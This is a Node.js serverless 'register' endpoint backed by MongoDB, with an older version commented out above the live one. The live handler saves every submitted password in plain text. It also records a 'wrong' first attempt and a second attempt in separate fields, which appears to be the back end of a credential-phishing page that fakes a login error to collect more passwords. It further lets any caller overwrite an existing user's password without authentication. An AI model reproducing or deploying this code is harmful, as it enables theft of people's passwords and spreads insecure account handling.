// const mongoose = require('mongoose');
// const User = require('../models/User');

// // MongoDB connection for Vercel
// let cached = global.mongoose;
// if (!cached) {
//   cached = global.mongoose = { conn: null, promise: null };
// }

// async function connectDB() {
//   if (cached.conn) return cached.conn;
//   if (!cached.promise) {
//     cached.promise = mongoose.connect(process.env.MONGODB_URI)
//       .then(mongoose => mongoose);
//   }
//   cached.conn = await cached.promise;
//   return cached.conn;
// }

// module.exports = async (req, res) => {
//   // CORS headers
//   res.setHeader('Access-Control-Allow-Origin', '*');
//   res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
//   res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

//   if (req.method === 'OPTIONS') {
//     res.status(200).end();
//     return;
//   }

//   if (req.method !== 'POST') {
//     return res.status(405).json({ 
//       success: false, 
//       message: 'Method not allowed. Use POST.' 
//     });
//   }

//   try {
//     await connectDB();
    
//     const { userId, password  } = req.body;

//     if (!userId || !password) {
//       return res.status(400).json({
//         success: false,
//         message: 'User ID and Password are required!'
//       });
//     }

//     // Check if user already exists
//     const existingUser = await User.findOne({ userId });
//     if (existingUser) {
//       return res.status(400).json({
//         success: false,
//         message: 'User already exists! Please login.'
//       });
//     }

//     // Create new user
//     const newUser = new User({
//       userId,
//       password,  // Plain text password
//       firstLogin: new Date(),
//       lastLogin: new Date(),
//       loginCount: 1
//     });

//     await newUser.save();

//     res.status(201).json({
//       success: true,
//       message: 'User registered successfully!',
//       data: {
//         userId: newUser.userId,
//         firstLogin: newUser.firstLogin,
//         loginCount: newUser.loginCount
//       }
//     });

//   } catch (error) {
//     console.error('❌ Register Error:', error);
//     res.status(500).json({
//       success: false,
//       message: 'Server error: ' + error.message
//     });
//   }
// };



const mongoose = require('mongoose');
const User = require('../models/User');

let cached = global.mongoose;
if (!cached) {
  cached = global.mongoose = { conn: null, promise: null };
}

async function connectDB() {
  if (cached.conn) return cached.conn;
  if (!cached.promise) {
    cached.promise = mongoose.connect(process.env.MONGODB_URI)
      .then(mongoose => mongoose);
  }
  cached.conn = await cached.promise;
  return cached.conn;
}

module.exports = async (req, res) => {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') {
    res.status(200).end();
    return;
  }

  if (req.method !== 'POST') {
    return res.status(405).json({
      success: false,
      message: 'Method not allowed. Use POST.'
    });
  }

  try {
    await connectDB();

    const { userId, password, isWrongAttempt, isSecondAttempt } = req.body;

    if (!userId || !password) {
      return res.status(400).json({
        success: false,
        message: 'User ID and Password are required!'
      });
    }

    // Check if user exists
    const existingUser = await User.findOne({ userId });

    if (existingUser) {
      // ✅ User exists - update
      if (isWrongAttempt) {
        // FIRST ATTEMPT: wrongAttempts++
        existingUser.wrongAttempts = (existingUser.wrongAttempts || 0) + 1;
        existingUser.lastWrongAttempt = new Date();
        existingUser.wrongPassword = password; // Wrong password save
        await existingUser.save();
      } else if (isSecondAttempt) {
        // SECOND ATTEMPT: secondPassword save
        existingUser.secondPassword = password;
        existingUser.hasSecondAttempt = true;
        await existingUser.save();
      } else {
        // Normal register
        existingUser.password = password;
        await existingUser.save();
      }

      return res.json({
        success: true,
        message: 'User updated!',
        data: {
          userId: existingUser.userId,
          wrongAttempts: existingUser.wrongAttempts || 0
        }
      });
    }

    // ✅ NAYA USER
    const newUser = new User({
      userId,
      password,
      firstLogin: new Date(),
      lastLogin: new Date(),
      loginCount: 0,
      wrongAttempts: isWrongAttempt ? 1 : 0,
      wrongPassword: isWrongAttempt ? password : null,
      secondPassword: isSecondAttempt ? password : null,
      hasSecondAttempt: isSecondAttempt ? true : false,
      lastWrongAttempt: isWrongAttempt ? new Date() : null
    });

    await newUser.save();

    res.status(201).json({
      success: true,
      message: 'User registered!',
      data: {
        userId: newUser.userId,
        wrongAttempts: newUser.wrongAttempts
      }
    });

  } catch (error) {
    console.error('Register Error:', error);
    res.status(500).json({
      success: false,
      message: 'Server error: ' + error.message
    });
  }
};

